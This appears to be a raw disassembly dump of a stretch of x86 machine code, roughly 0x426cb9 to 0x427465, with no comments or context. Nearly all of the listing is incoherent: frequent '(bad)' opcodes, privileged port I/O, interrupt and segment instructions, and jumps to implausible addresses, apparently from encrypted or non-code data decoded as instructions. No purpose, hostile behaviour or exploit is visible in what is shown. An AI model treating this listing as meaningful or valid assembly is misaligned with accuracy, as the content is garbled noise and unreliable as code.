  426cb9:	lods   al,BYTE PTR ds:[esi]
  426cba:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  426cbc:	cmp    esp,DWORD PTR [edx]
  426cbe:	push   0x23
  426cc0:	shl    DWORD PTR [ecx-0x3f1172d4],1
  426cc6:	clc    
  426cc7:	cmp    BYTE PTR [edx],al
  426cc9:	xchg   esi,eax
  426cca:	cli    
  426ccb:	in     eax,0x44
  426ccd:	inc    ecx
  426cce:	daa    
  426ccf:	pop    ecx
  426cd0:	pop    ds
  426cd1:	call   0x9ba4fc7d
  426cd6:	or     al,0x9
  426cd8:	sub    al,BYTE PTR [edi+eiz*4-0x52]
  426cdc:	cmp    eax,0x2f7fef0f
  426ce1:	dec    ebx
  426ce2:	in     eax,0xc5
  426ce4:	lods   al,BYTE PTR ds:[esi]
  426ce6:	xor    al,0xa9
  426ce8:	mov    bh,0x13
  426cea:	dec    ecx
  426ceb:	xchg   esi,eax
  426cec:	int    0xe0
  426cee:	inc    edx
  426cef:	repnz or BYTE PTR [ecx-0x7c],dl
  426cf3:	push   ss
  426cf4:	push   cs
  426cf5:	jbe    0x426d72
  426cf7:	pop    eax
  426cf8:	jo     0x426c9b
  426cfa:	mov    cl,0x42
  426cfc:	adc    DWORD PTR [ebx+0x9fa9a48],0x7b
  426d03:	adc    bh,BYTE PTR [ecx-0xec8ff25]
  426d09:	mov    bl,0x24
  426d0b:	and    DWORD PTR [edx+0x17],0xe47ca4c5
  426d12:	add    BYTE PTR [ebx+0x64],ch
  426d15:	(bad)  
  426d16:	jl     0x426d1e
  426d18:	inc    esp
  426d19:	shl    BYTE PTR [esi+0x23],cl
  426d1c:	and    BYTE PTR [esi],ah
  426d1e:	pop    DWORD PTR [esi+0x445d175e]
  426d24:	jmp    0x945b1d6c
  426d29:	adc    bh,ah
  426d2b:	add    al,0x2a
  426d2d:	in     al,dx
  426d2e:	push   ecx
  426d2f:	lock cli 
  426d31:	ins    DWORD PTR es:[edi],dx
  426d32:	xchg   edi,eax
  426d33:	add    BYTE PTR [ebx+0x71],al
  426d36:	or     esi,DWORD PTR [edx+edi*8+0x24583470]
  426d3d:	int    0xfa
  426d3f:	sahf   
  426d40:	sbb    al,0xb8
  426d42:	fild   WORD PTR [edi-0x3be91f2d]
  426d48:	cs nop
  426d4a:	push   0x91a887dd
  426d4f:	or     BYTE PTR [edx],0x67
  426d52:	mov    fs,WORD PTR [ebp+0x23937ba6]
  426d58:	pop    edx
  426d59:	mov    WORD PTR [ebx],cs
  426d5b:	stc    
  426d5c:	xor    BYTE PTR [edx+0x51],dl
  426d5f:	jmp    0x426d0c
  426d61:	aad    0x99
  426d63:	gs or  al,0x29
  426d66:	mov    ds:0xe8dd3705,al
  426d6b:	inc    esi
  426d6c:	mov    bh,0x75
  426d6e:	inc    ebx
  426d6f:	lds    ebp,FWORD PTR [edi]
  426d71:	lods   eax,DWORD PTR ds:[esi]
  426d72:	lods   al,BYTE PTR ds:[esi]
  426d73:	adc    al,0x70
  426d75:	push   es
  426d76:	pusha  
  426d77:	add    eax,0x85bdc633
  426d7c:	out    dx,eax
  426d7d:	rol    edi,0x30
  426d80:	ins    BYTE PTR es:[edi],dx
  426d81:	mov    ebp,0x2af136d0
  426d86:	sbb    al,0x3f
  426d88:	fisttp DWORD PTR [edi+0x68852526]
  426d8e:	or     al,0x3d
  426d90:	(bad)  
  426d91:	fmul   st,st(7)
  426d93:	shl    DWORD PTR [eax+0x482365a0],0xfa
  426d9a:	xor    eax,0xbdd337e4
  426d9f:	pop    edi
  426da0:	adc    bh,ch
  426da2:	xor    al,0x0
  426da4:	arpl   bp,bx
  426da6:	es jo  0x426d57
  426da9:	add    ebx,ebx
  426dab:	cli    
  426dac:	sub    BYTE PTR [edi-0x3],ch
  426daf:	jo     0x426e2b
  426db1:	inc    ebx
  426db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426db3:	add    al,BYTE PTR [esi]
  426db5:	xchg   DWORD PTR [ecx-0x1ddf79d4],eax
  426dbb:	out    0x6d,eax
  426dbd:	xchg   ebx,eax
  426dbe:	retf   
  426dbf:	or     DWORD PTR [esi+0xe],esp
  426dc2:	arpl   WORD PTR [edi-0x5f55baf5],sp
  426dc8:	cdq    
  426dc9:	popa   
  426dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426dcb:	sbb    ebp,DWORD PTR [edi-0x22]
  426dce:	outs   dx,BYTE PTR ds:[esi]
  426dcf:	jbe    0x426dd6
  426dd1:	pop    ebx
  426dd2:	je     0x426dfe
  426dd4:	mov    cs,WORD PTR [ebp+0x71d737dc]
  426dda:	test   eax,0x9f2d0eda
  426ddf:	fisub  WORD PTR [ebx+0x248422d0]
  426de5:	mov    bl,BYTE PTR [eax-0x77]
  426de8:	mov    al,ds:0xd70a71c7
  426ded:	add    ebp,DWORD PTR [eax]
  426def:	ins    DWORD PTR es:[edi],dx
  426df0:	add    BYTE PTR fs:[esp+esi*1+0x43],bh
  426df5:	(bad)  
  426df6:	mov    dl,0x55
  426df8:	loope  0x426dce
  426dfa:	jo     0x426dd1
  426dfc:	repz test eax,0xa9c9071e
  426e02:	jno    0x426e1c
  426e04:	push   ss
  426e05:	pop    edx
  426e06:	mov    ecx,0x67033ce0
  426e0b:	or     dl,bh
  426e0d:	(bad)  
  426e0e:	les    ebp,FWORD PTR [ebp-0x14]
  426e11:	mov    eax,0x93a5024c
  426e16:	xchg   DWORD PTR [esi+0x7e],eax
  426e19:	pusha  
  426e1a:	popf   
  426e1b:	adc    eax,DWORD PTR [edx+0x6dc0014c]
  426e21:	(bad)  
  426e23:	rcl    BYTE PTR [ebx-0x3dfe7ba7],cl
  426e29:	pop    edi
  426e2a:	int3   
  426e2b:	iret   
  426e2c:	or     bl,dl
  426e2e:	or     al,0xea
  426e30:	retf   0x3e39
  426e33:	jmp    0x60d3497
  426e38:	out    0x1e,al
  426e3a:	test   eax,0x5d819a26
  426e3f:	gs sbb eax,0xa7e7c65f
  426e45:	inc    esp
  426e46:	imul   DWORD PTR [ebx-0x3025c050]
  426e4c:	sbb    eax,DWORD PTR [eax+0x32]
  426e4f:	push   ds
  426e50:	pusha  
  426e51:	std    
  426e52:	rcl    BYTE PTR [ebp+0x26e32af1],0xcb
  426e59:	int    0x31
  426e5b:	scas   al,BYTE PTR es:[edi]
  426e5c:	daa    
  426e5d:	mov    al,ds:0x96d0a62f
  426e62:	pop    esp
  426e63:	enter  0x879f,0x9
  426e67:	pushf  
  426e68:	ins    BYTE PTR es:[edi],dx
  426e69:	mov    bh,0x56
  426e6b:	out    dx,eax
  426e6c:	fidivr WORD PTR [esp+edi*8]
  426e6f:	repnz cmp eax,ebp
  426e72:	pop    ebp
  426e73:	icebp  
  426e74:	pop    ebx
  426e75:	mov    es,WORD PTR [edx+0x2daaa2ae]
  426e7b:	test   al,0xfe
  426e7d:	push   sp
  426e7f:	shr    BYTE PTR [ebx+ecx*2+0x51cc9275],0x10
  426e87:	scas   eax,DWORD PTR es:[edi]
  426e88:	push   ebx
  426e89:	or     DWORD PTR [eax],ecx
  426e8b:	adc    al,0xb9
  426e8d:	les    esi,FWORD PTR [edi-0x1366b7f7]
  426e93:	pop    edi
  426e94:	push   ebx
  426e95:	inc    esi
  426e96:	dec    edx
  426e97:	jne    0x426efa
  426e99:	or     al,0x78
  426e9b:	xor    DWORD PTR [edx-0x4d],edx
  426e9e:	jle    0x426e92
  426ea0:	push   es
  426ea1:	std    
  426ea2:	xlat   BYTE PTR ds:[ebx]
  426ea3:	xor    DWORD PTR [ebx],edi
  426ea5:	push   ebp
  426ea6:	and    ch,bh
  426ea8:	fcomp  st(1)
  426eaa:	mov    cl,0xe6
  426eac:	sub    al,dl
  426eae:	mov    dl,0xdf
  426eb0:	mov    edi,0xdd47ffd3
  426eb5:	shl    ah,cl
  426eb7:	mov    WORD PTR [edi-0x370184dd],cs
  426ebd:	or     al,0x15
  426ebf:	push   0xc806027d
  426ec4:	fisub  WORD PTR [esi+0x3b]
  426ec7:	add    edx,edx
  426ec9:	push   esp
  426eca:	addr16 popa 
  426ecc:	pop    edx
  426ecd:	adc    BYTE PTR [edx],dl
  426ecf:	popa   
  426ed0:	lods   eax,DWORD PTR ds:[esi]
  426ed1:	sub    al,0x7e
  426ed3:	cmc    
  426ed4:	fisttp WORD PTR [ecx+eax*2]
  426ed7:	ficom  WORD PTR [ebp-0x289b4da3]
  426edd:	inc    eax
  426ede:	adc    al,0xc3
  426ee0:	cmp    BYTE PTR [eax+esi*4+0x18],bh
  426ee4:	mov    cl,0x30
  426ee6:	jl     0x426e81
  426ee8:	les    ebp,FWORD PTR [edi-0x490ec042]
  426eee:	in     al,dx
  426eef:	pop    ds
  426ef0:	adc    al,0x71
  426ef2:	enter  0x1e2a,0x56
  426ef6:	sub    eax,edx
  426ef8:	push   ecx
  426ef9:	pop    ebp
  426efa:	jecxz  0x426eeb
  426efc:	retf   0x15ec
  426eff:	and    dl,dl
  426f01:	fwait
  426f02:	or     edi,esi
  426f04:	push   ebp
  426f05:	mov    BYTE PTR [ebp+0x13],cl
  426f08:	mov    esi,0x7cbc33c4
  426f0d:	add    eax,DWORD PTR [ebx+ecx*4+0x6e]
  426f11:	je     0x426eae
  426f13:	push   es
  426f14:	or     al,0x6c
  426f16:	mul    DWORD PTR ds:0xe8ff03d4
  426f1c:	sub    al,BYTE PTR [ebp-0x5c]
  426f1f:	je     0x426ebf
  426f21:	push   0xa06d6ff
  426f26:	in     al,dx
  426f27:	cdq    
  426f28:	mov    bh,0xdf
  426f2a:	cs pop esp
  426f2c:	mov    ecx,DWORD PTR [ebx]
  426f2e:	add    al,0x6d
  426f30:	mov    dl,0xd
  426f32:	jo     0x426ee5
  426f34:	out    dx,eax
  426f35:	test   al,0x36
  426f37:	outs   dx,DWORD PTR ds:[esi]
  426f38:	adc    DWORD PTR [ebp-0x57],ebp
  426f3b:	lods   al,BYTE PTR ds:[esi]
  426f3c:	fwait
  426f3d:	add    cl,dl
  426f3f:	lds    esi,FWORD PTR [ecx]
  426f41:	int    0xd0
  426f43:	fxch   st(1)
  426f45:	imul   dl
  426f47:	fisubr DWORD PTR [eax-0x15]
  426f4a:	pop    esi
  426f4b:	fwait
  426f4c:	push   edx
  426f4d:	jge    0x426f51
  426f4f:	push   ecx
  426f50:	enter  0xe05f,0xeb
  426f54:	jbe    0x426f76
  426f56:	jmp    0x426f0d
  426f58:	sub    DWORD PTR ds:[ecx-0x7f81e5d1],0x43c7adbf
  426f63:	dec    esi
  426f64:	xchg   edx,eax
  426f65:	sub    dh,BYTE PTR [esi-0x51]
  426f68:	loopne 0x426f3e
  426f6a:	and    eax,0xb1b73e76
  426f6f:	push   cs
  426f70:	repnz imul ebp,DWORD PTR [ebp-0x20],0xe8453c65
  426f78:	ins    BYTE PTR es:[edi],dx
  426f79:	fwait
  426f7a:	pop    esi
  426f7b:	shr    DWORD PTR [edx-0x1b2e848],cl
  426f81:	pop    ebx
  426f82:	idiv   DWORD PTR [edx-0x4f27e60a]
  426f88:	(bad)  
  426f89:	dec    esi
  426f8a:	dec    DWORD PTR [eax+esi*4+0x40]
  426f8e:	inc    ebx
  426f8f:	loopne 0x426f20
  426f91:	push   edx
  426f92:	scas   al,BYTE PTR es:[edi]
  426f93:	(bad)  [edx]
  426f95:	std    
  426f96:	das    
  426f97:	jg     0x426f9c
  426f99:	mov    al,0xfb
  426f9b:	xchg   edi,eax
  426f9c:	xchg   edi,eax
  426f9d:	mov    esp,0xf81bc1b4
  426fa2:	imul   ebp,DWORD PTR [ebx-0x1db23512],0x2afc22ee
  426fac:	rcr    BYTE PTR [ecx],0xca
  426faf:	lods   al,BYTE PTR ds:[esi]
  426fb0:	add    al,0x52
  426fb2:	mov    dh,BYTE PTR [esi+0x17034943]
  426fb8:	dec    edi
  426fb9:	jnp    0x426f9e
  426fbb:	jecxz  0x427036
  426fbd:	das    
  426fbe:	pop    edx
  426fbf:	jge    0x426fc5
  426fc1:	inc    edi
  426fc2:	and    eax,0xfb398458
  426fc7:	ss in  eax,0x5b
  426fca:	or     ebx,ebp
  426fcc:	add    bh,bh
  426fce:	pop    es
  426fcf:	push   ebp
  426fd0:	scas   al,BYTE PTR es:[edi]
  426fd1:	push   edi
  426fd2:	or     ebx,DWORD PTR [edx+0x69e15aff]
  426fd8:	(bad)  
  426fd9:	ins    BYTE PTR es:[edi],dx
  426fda:	jb     0x427053
  426fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426fdd:	retf   
  426fde:	out    0x39,al
  426fe0:	and    bh,0x14
  426fe3:	aas    
  426fe4:	call   FWORD PTR ds:0x3447c729
  426fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426feb:	xor    al,0xe6
  426fed:	bound  edx,QWORD PTR [edx]
  426fef:	cvtdq2ps xmm4,XMMWORD PTR [ebx]
  426ff2:	pop    DWORD PTR [edi]
  426ff4:	sbb    ecx,DWORD PTR [esi+0x2]
  426ff7:	repnz iret 
  426ff9:	scas   al,BYTE PTR es:[edi]
  426ffa:	push   edx
  426ffb:	std    
  426ffc:	xor    cl,BYTE PTR [eax]
  426ffe:	shr    DWORD PTR [ebp-0x7d],cl
  427001:	enter  0x3d55,0x1a
  427005:	neg    esi
  427007:	sbb    eax,0x834b36da
  42700c:	in     eax,0x1e
  42700e:	add    edx,ebp
  427010:	push   edi
  427011:	sbb    DWORD PTR [ecx+0x34],0xed
	...
  427020:	add    BYTE PTR [ebx],bl
  427022:	inc    ebp
  427023:	gs ret 
  427025:	jg     0x42700a
  427027:	mov    edi,0x3db787dd
  42702c:	shr    BYTE PTR [edx+0x5929a492],cl
  427032:	out    0x1,al
  427034:	add    BYTE PTR [ebx+eax*1-0x76930000],ch
  42703b:	sbb    DWORD PTR [edi+edi*1],edi
  42703e:	repz (bad) 
  427040:	fldcw  WORD PTR [ecx+0x55e8053c]
  427046:	into   
  427047:	pusha  
  427048:	cmp    al,0x78
  42704a:	dec    ecx
  42704b:	add    eax,0x655b57c5
  427050:	mov    edx,0x3a10f4c3
  427055:	adc    eax,0xa2111351
  42705b:	jge    0x426fde
  42705d:	dec    ebp
  42705e:	xchg   ecx,eax
  42705f:	or     al,0x21
  427061:	rcr    BYTE PTR [ecx-0x1f],1
  427064:	xor    al,0x35
  427066:	push   edi
  427067:	pushf  
  427068:	dec    esi
  427069:	bound  ebx,QWORD PTR [edi-0x667e22b8]
  42706f:	dec    ebx
  427070:	stos   DWORD PTR es:[edi],eax
  427071:	add    BYTE PTR [bp+si+0x44],al
  427075:	fs fst st(6)
  427078:	adc    DWORD PTR [edx-0x27],edi
  42707b:	jl     0x42702c
  42707d:	(bad)  
  42707e:	push   0xe273939b
  427083:	dec    eax
  427084:	test   eax,esi
  427086:	jecxz  0x4270c9
  427088:	push   edx
  427089:	pop    ebx
  42708a:	repz push edi
  42708c:	pop    esp
  42708d:	xchg   bx,ax
  42708f:	xchg   DWORD PTR [esi],ebx
  427091:	add    BYTE PTR [esi],cl
  427093:	push   edi
  427094:	xchg   ebx,eax
  427095:	mov    ch,0xb5
  427097:	out    0xa4,eax
  427099:	mov    ds:0xcba5cfdf,eax
  42709e:	xor    al,0x18
  4270a0:	and    BYTE PTR [ecx-0x71d02f89],0x95
  4270a7:	dec    ebp
  4270a8:	pushf  
  4270a9:	imul   ebx,DWORD PTR [esi],0x4f
  4270ac:	call   0x3db6:0xaeab434a
  4270b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270b4:	scas   al,BYTE PTR es:[edi]
  4270b5:	rcr    DWORD PTR [ecx],0xcc
  4270b8:	adc    eax,0x6ce1a33e
  4270bd:	inc    ebx
  4270be:	xor    DWORD PTR [eax+0x6a],ecx
  4270c1:	std    
  4270c2:	repz and bh,ch
  4270c5:	mov    ebx,0xfe7d619c
  4270ca:	adc    DWORD PTR [edi-0x3ed842f],esi
  4270d0:	jmp    0x42714e
  4270d2:	push   0xfffffff4
  4270d4:	or     al,0xce
  4270d6:	repz xchg esi,eax
  4270d8:	mov    bl,BYTE PTR [edx]
  4270da:	(bad)  
  4270dc:	ins    DWORD PTR es:[edi],dx
  4270dd:	mov    ah,0xb4
  4270df:	lods   al,BYTE PTR ds:[esi]
  4270e0:	jns    0x4270f7
  4270e2:	xchg   ecx,eax
  4270e3:	cmc    
  4270e4:	dec    edx
  4270e5:	je     0x4270cb
  4270e7:	mov    edi,0x5bd4309f
  4270ec:	sub    sp,ax
  4270ef:	rcr    cl,0xc8
  4270f2:	sub    DWORD PTR [ebp-0x7502cb09],ecx
  4270f8:	xchg   ecx,eax
  4270f9:	rcr    BYTE PTR ds:0x7dc7d575,1
  4270ff:	sub    eax,0x7cc9cd29
  427104:	repz mov esp,0x781242f7
  42710a:	mov    ah,BYTE PTR [eax+0x76]
  42710d:	cmp    cl,0x3e
  427110:	and    BYTE PTR [esi+0x4cf3bb12],cl
  427116:	mov    eax,0x2c8eb512
  42711b:	mov    ebx,0xa4151549
  427120:	push   0xffffff96
  427122:	mov    ch,BYTE PTR [eax-0x33]
  427125:	push   esi
  427126:	cli    
  427127:	jg     0x427160
  427129:	pop    eax
  42712a:	out    0xf3,eax
  42712c:	icebp  
  42712d:	fst    DWORD PTR [esi]
  42712f:	cs mov ah,0x84
  427132:	sbb    DWORD PTR [edx],edx
  427134:	inc    esi
  427135:	adc    BYTE PTR ds:0xd746521,0x90
  42713c:	xchg   BYTE PTR [eax+0x12],ah
  42713f:	jg     0x427101
  427141:	push   0x43
  427143:	mov    WORD PTR [edx],fs
  427145:	add    al,0xd4
  427147:	into   
  427148:	cld    
  427149:	jns    0x427178
  42714b:	inc    ebp
  42714c:	jl     0x427103
  42714e:	xlat   BYTE PTR ds:[ebx]
  42714f:	ror    BYTE PTR [eax],0x17
  427152:	and    DWORD PTR [ecx],ecx
  427154:	mov    eax,0xb2609eb2
  427159:	mov    eax,0xa6f75e18
  42715e:	jecxz  0x427136
  427160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427161:	sbb    esp,edx
  427163:	jp     0x4271cc
  427165:	out    dx,al
  427166:	and    BYTE PTR [eax+ebp*8-0x29],bh
  42716a:	mov    bh,0x7d
  42716c:	mov    eax,ds:0xd35dc213
  427171:	ss sub eax,0xbc21d8c9
  427177:	pushf  
  427178:	js     0x4271c1
  42717a:	sbb    DWORD PTR ds:0xb9373414,edx
  427180:	mov    ch,0xa3
  427182:	call   0x203051ef
  427187:	sub    ch,BYTE PTR ss:[ebx-0x72]
  42718b:	imul   eax,DWORD PTR [ebx+0x71],0xd7de6bec
  427192:	cmc    
  427193:	adc    esp,esi
  427195:	mov    dh,0x96
  427197:	iret   
  427198:	add    DWORD PTR [eax],0xffffffaa
  42719b:	test   esi,0x22be6dc1
  4271a1:	jmp    0x7615cf1
  4271a6:	jg     0x427214
  4271a8:	(bad)  
  4271a9:	cwde   
  4271aa:	out    0x13,eax
  4271ac:	std    
  4271ad:	mov    al,0x69
  4271af:	mov    al,dh
  4271b1:	xchg   DWORD PTR [esi-0x49],edi
  4271b4:	cmp    dl,dl
  4271b6:	sar    DWORD PTR [ebx-0x4086e27a],cl
  4271bc:	pushf  
  4271bd:	dec    eax
  4271be:	push   ecx
  4271bf:	repnz in eax,dx
  4271c1:	cmp    al,0x7e
  4271c4:	sbb    al,0x3d
  4271c6:	rcr    al,cl
  4271c8:	fild   QWORD PTR [ebx-0x3c6ecbac]
  4271ce:	fs sub eax,0xeb5c4318
  4271d4:	ja     0x427254
  4271d6:	inc    ebx
  4271d7:	test   eax,0x251b8210
  4271dc:	inc    ecx
  4271dd:	repnz push cs
  4271df:	add    cl,BYTE PTR [edi-0x1a]
  4271e2:	sub    al,0xdf
  4271e4:	dec    ebx
  4271e5:	retf   0xb799
  4271e8:	xchg   DWORD PTR [ebx-0x4e],eax
  4271eb:	adc    bh,BYTE PTR cs:[ebx-0x5c16be9]
  4271f2:	and    edi,DWORD PTR [edx-0xe]
  4271f5:	idiv   BYTE PTR [ebp-0x3]
  4271f8:	sub    al,0x84
  4271fa:	sub    DWORD PTR [esi-0x5f499c6a],ebx
  427200:	ror    cl,cl
  427202:	das    
  427203:	rcr    ah,0x90
  427206:	mov    edi,DWORD PTR [eax+0x4a]
  427209:	adc    eax,0x53bfedda
  42720e:	dec    ebp
  42720f:	lods   al,BYTE PTR ds:[esi]
  427210:	hlt    
  427211:	adc    edx,ebx
  427213:	sbb    eax,0x2a57f3c0
  427218:	sbb    dl,BYTE PTR [ecx+0x1b]
  42721b:	icebp  
  42721c:	sub    al,0x78
  42721e:	jbe    0x42727b
  427220:	push   ebp
  427221:	add    al,0x6e
  427223:	retf   
  427224:	push   edx
  427225:	mov    edi,0x8b2236ca
  42722a:	rcl    DWORD PTR [esp+ebx*2],cl
  42722d:	fldenv [ecx+0x75186145]
  427233:	ror    BYTE PTR [ebp-0x1ed3f9bb],1
  427239:	sbb    eax,ebx
  42723b:	pop    ecx
  42723c:	xchg   edi,eax
  42723d:	xor    al,0x5a
  42723f:	retf   
  427240:	mov    ah,0x8d
  427242:	das    
  427243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427244:	out    dx,eax
  427245:	cdq    
  427246:	into   
  427247:	pop    esi
  427248:	mov    bh,0x1b
  42724a:	sti    
  42724b:	push   0xffffffa2
  42724d:	(bad)  
  42724e:	in     eax,0x87
  427250:	outs   dx,DWORD PTR ds:[esi]
  427251:	ds jge 0x427244
  427254:	ins    DWORD PTR es:[edi],dx
  427255:	xor    ebp,DWORD PTR [esi+0x32d79ff9]
  42725b:	ffree  st(3)
  42725d:	div    BYTE PTR [ecx-0x78c01c5]
  427263:	jl     0x427206
  427265:	push   ebx
  427266:	(bad)  
  427267:	mov    eax,0xf1a4b6d6
  42726c:	fimul  DWORD PTR [eax-0x1493a4f0]
  427272:	dec    edx
  427273:	cmp    dh,BYTE PTR [ebp+0x5c]
  427276:	sub    eax,0x464992a
  42727b:	xor    esi,DWORD PTR [esi+0x197b9ed8]
  427281:	adc    eax,0xebe2ac10
  427286:	pushf  
  427287:	(bad)  
  427288:	aas    
  427289:	repnz push ebx
  42728b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42728c:	mov    eax,0xa27308f
  427291:	sbb    al,BYTE PTR [ecx]
  427293:	icebp  
  427294:	adc    dl,bh
  427296:	dec    DWORD PTR [eax+0x16]
  427299:	mov    ch,BYTE PTR [ebp+0x7f597f34]
  42729f:	repz dec ebp
  4272a1:	sub    ah,BYTE PTR [edi+eax*4-0x80]
  4272a5:	(bad)  
  4272a6:	inc    edi
  4272a7:	iret   
  4272a8:	jno    0x4272d6
  4272aa:	mov    bl,0x14
  4272ac:	sub    BYTE PTR [edx+0x30ea4e5a],0x44
  4272b3:	(bad)  
  4272b5:	and    edi,DWORD PTR [ecx]
  4272b7:	adc    dl,BYTE PTR [ebx+0x735d8def]
  4272bd:	xchg   ecx,eax
  4272be:	daa    
  4272bf:	mov    DWORD PTR [eax+edi*4-0x15],ebp
  4272c3:	mov    DWORD PTR [ecx+0x1ab6b79c],edx
  4272c9:	cmc    
  4272ca:	adc    dh,bh
  4272cc:	stos   BYTE PTR es:[edi],al
  4272cd:	outs   dx,DWORD PTR ds:[esi]
  4272ce:	xor    BYTE PTR [eax-0xb5ed8d1],0xcc
  4272d5:	loop   0x42734f
  4272d7:	hlt    
  4272d8:	and    DWORD PTR [edi],edi
  4272da:	xchg   esp,eax
  4272db:	adc    DWORD PTR [ecx],edx
  4272dd:	mov    cl,0x85
  4272df:	and    eax,0xb7338eda
  4272e4:	ds cwde 
  4272e6:	lds    edx,FWORD PTR [ecx+ebp*4-0x33926bf0]
  4272ed:	inc    ebx
  4272ee:	call   0x1b0e59c5
  4272f3:	out    0x3f,al
  4272f5:	jmp    DWORD PTR [edx-0x56a0a4e9]
  4272fb:	mov    bh,0xc8
  4272fd:	or     al,0x2a
  4272ff:	fcom   DWORD PTR [edi]
  427301:	pop    ecx
  427302:	dec    ebp
  427303:	fucomi st,st(0)
  427305:	inc    ecx
  427306:	dec    esi
  427307:	jbe    0x427381
  427309:	in     eax,0x79
  42730b:	les    ebp,FWORD PTR [esi+0x3860d2c5]
  427311:	into   
  427312:	ror    DWORD PTR [eax],cl
  427314:	dec    edx
  427315:	sub    BYTE PTR [ecx+0x4e09f180],dh
  42731b:	outs   dx,BYTE PTR ds:[esi]
  42731c:	mov    bh,0xf3
  42731e:	data16 shl BYTE PTR [edi-0x2b],cl
  427322:	in     eax,0x51
  427324:	xchg   DWORD PTR [edx+0x6c05c246],ebx
  42732a:	jmp    0x4272c7
  42732c:	outs   dx,DWORD PTR ds:[esi]
  42732d:	repnz mov ch,0x3a
  427330:	jg     0x4272cb
  427332:	into   
  427333:	sbb    ebx,esp
  427335:	ss test bl,cl
  427338:	jmp    0x4272d9
  42733a:	pop    edi
  42733b:	sub    ch,BYTE PTR [esi]
  42733d:	xor    DWORD PTR [edi],eax
  42733f:	test   dl,0xd6
  427342:	rol    BYTE PTR [edx+edi*1+0x7e],1
  427346:	mov    al,ds:0x150caa76
  42734b:	sub    DWORD PTR [eax+eiz*2],edx
  42734e:	mov    ds,WORD PTR [ecx-0x6c]
  427351:	sbb    edx,DWORD PTR [edi]
  427353:	xor    al,BYTE PTR ds:[edi]
  427356:	adc    eax,0x73f0fef4
  42735b:	test   BYTE PTR [esi+0x6864fba4],cl
  427361:	sbb    eax,0x7d35f0f
  427366:	or     DWORD PTR [eax+eiz*4],esi
  427369:	pop    esi
  42736a:	test   BYTE PTR [eax-0x17],bh
  42736d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42736e:	jmp    0x50c09473
  427373:	loope  0x42736a
  427375:	mov    eax,ds:0xbeee1388
  42737a:	dec    esi
  42737b:	faddp  st(1),st
  42737d:	pop    ebx
  42737e:	outs   dx,DWORD PTR ds:[esi]
  42737f:	mov    ds:0x261c5910,al
  427384:	clc    
  427385:	int    0x87
  427387:	mov    esp,0x17379f6d
  42738c:	pusha  
  42738d:	outs   dx,DWORD PTR ds:[esi]
  42738e:	add    eax,0x97a7c177
  427393:	push   ecx
  427394:	(bad)  
  427395:	(bad)  
  427396:	jmp    0xe6e9fd4d
  42739b:	int    0xa2
  42739d:	add    DWORD PTR [esi],ebp
  42739f:	or     dh,ch
  4273a1:	out    0x24,al
  4273a3:	outs   dx,DWORD PTR ds:[esi]
  4273a4:	iret   
  4273a5:	scas   al,BYTE PTR es:[edi]
  4273a6:	lods   eax,DWORD PTR ds:[esi]
  4273a7:	adc    ebp,ebp
  4273a9:	(bad)  
  4273ab:	xchg   BYTE PTR [esi-0x2f],ah
  4273ae:	arpl   WORD PTR [esi],bx
  4273b0:	dec    eax
  4273b1:	inc    ebp
  4273b2:	adc    eax,0xfd7ba50f
  4273b7:	lock sub bl,BYTE PTR [esi+0x11]
  4273bb:	lea    edx,[ecx-0x6c]
  4273be:	rol    BYTE PTR [eax+edx*1],cl
  4273c1:	jno    0x42738c
  4273c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273c4:	out    0x84,eax
  4273c6:	mov    WORD PTR [eax+0x5e7c357c],?
  4273cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273cd:	mov    ebx,eax
  4273cf:	repz cwde 
  4273d1:	xchg   ecx,eax
  4273d2:	sbb    ecx,0xffffffb8
  4273d5:	pusha  
  4273d6:	cli    
  4273d7:	adc    ch,bl
  4273d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273da:	(bad)  
  4273db:	jns    0x427401
  4273dd:	aaa    
  4273de:	adc    edx,DWORD PTR [ebx]
  4273e0:	int    0x96
  4273e2:	pop    ss
  4273e3:	pop    edx
  4273e4:	or     al,BYTE PTR [eax]
	...
  4273ee:	add    BYTE PTR [eax],al
  4273f0:	add    BYTE PTR [edi+eax*2],cl
  4273f3:	inc    ebx
  4273f4:	xchg   esp,eax
  4273f5:	dec    ebx
  4273f6:	xchg   esp,eax
  4273f7:	(bad)  
  4273f9:	mov    eax,0x8219f609
  4273fe:	scas   al,BYTE PTR es:[edi]
  4273ff:	sbb    DWORD PTR ds:0x1ea05,edx
  427405:	lods   al,BYTE PTR ds:[esi]
  427406:	add    eax,DWORD PTR [eax]
  427408:	add    cl,ch
  42740a:	call   0x38f052e4
  42740f:	sahf   
  427410:	xchg   edi,eax
  427411:	dec    ebp
  427412:	add    BYTE PTR ds:0xd0278416,dl
  427418:	sub    edi,DWORD PTR [ebx]
  42741a:	repnz mov ecx,0x3431c9dc
  427420:	mov    eax,DWORD PTR [esi]
  427422:	dec    ecx
  427423:	cmc    
  427424:	inc    edi
  427425:	inc    eax
  427426:	mov    WORD PTR [ecx+0x1c219156],es
  42742c:	sti    
  42742d:	push   ds
  42742e:	int3   
  42742f:	scas   eax,DWORD PTR es:[edi]
  427430:	gs jne 0x42749b
  427433:	out    dx,eax
  427434:	pop    esp
  427435:	pop    ebx
  427436:	mov    ecx,0x227d8079
  42743b:	stos   BYTE PTR es:[edi],al
  42743c:	jne    0x427414
  42743e:	mov    esp,0x4cdea378
  427443:	pop    eax
  427444:	xor    BYTE PTR [edx],dl
  427446:	inc    ebp
  427447:	pop    esp
  427448:	dec    esi
  427449:	pusha  
  42744a:	and    ecx,DWORD PTR [edx]
  42744c:	retf   
  42744d:	sub    eax,0xe36e8b3e
  427452:	pop    edi
  427453:	jae    0x4274a9
  427455:	xchg   DWORD PTR [edi+0x709ecb],edx
  42745b:	repz fs inc ebx
  42745e:	and    esp,edx
  427460:	cmp    al,BYTE PTR [ebx-0x43]
  427463:	and    esp,DWORD PTR [ecx]
  427465:	aas    
